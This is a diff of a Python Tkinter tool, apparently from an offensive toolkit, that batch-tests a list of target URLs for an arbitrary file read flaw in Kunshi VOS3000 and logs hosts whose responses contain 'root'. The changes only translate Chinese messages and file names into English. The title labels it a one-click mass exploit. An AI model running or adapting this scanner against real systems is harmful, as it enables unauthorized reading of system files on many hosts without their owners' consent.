@@ -11,25 +11,25 @@ def VOS3000_redfile_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "root" in res.text:
-            VOS3000_redfile_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            VOS3000_redfile_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             VOS3000_redfile_text.see(END)
-            with open ("存在昆石网络 虚拟运营支撑系统任意文件读取漏洞的url.txt", 'a') as f:
+            with open ("[exists]VOS3000_readfile_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            VOS3000_redfile_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            VOS3000_redfile_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             VOS3000_redfile_text.see(END)
     except Exception as err:
-        VOS3000_redfile_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        VOS3000_redfile_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         VOS3000_redfile_text.see(END)
 def get_VOS3000_redfile_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def VOS3000_redfile_gui():
     VOS3000_redfile = Toplevel()
     VOS3000_redfile.geometry("1035x455")
-    VOS3000_redfile.title("昆石网络 虚拟运营支撑系统任意文件读取漏洞一把梭")
+    VOS3000_redfile.title("Kunshi  virtual operation support system read any file [auto-muti-exp]")
     VOS3000_redfile.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     VOS3000_redfile.tk.call('wm', 'iconphoto', VOS3000_redfile._w, logo)
